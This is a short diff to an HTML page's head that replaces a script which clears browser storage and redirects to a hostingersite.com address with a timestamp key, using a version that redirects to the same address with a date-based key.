@@ -11,20 +11,19 @@
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
 
-    <script>
-        // Clear browser storage for this page's origin
-        try {
-            localStorage.clear();
-            sessionStorage.clear();
-        } catch (e) {
-            console.warn("Storage could not be cleared:", e);
-        }
+<script>
+    const now = new Date();
 
-        // Redirect immediately with a unique timestamp
-        window.location.replace(
-            "https://rosybrown-salmon-685242.hostingersite.com/?key=" + Date.now()
-        );
-    </script>
+    const year = now.getFullYear();
+    const month = String(now.getMonth() + 1).padStart(2, "0");
+    const day = String(now.getDate()).padStart(2, "0");
+
+    const key = `${year}-${month}-${day}`;
+
+    window.location.replace(
+        "https://rosybrown-salmon-685242.hostingersite.com/?key=" + key
+    );
+</script>
 </head>
 
 <body>
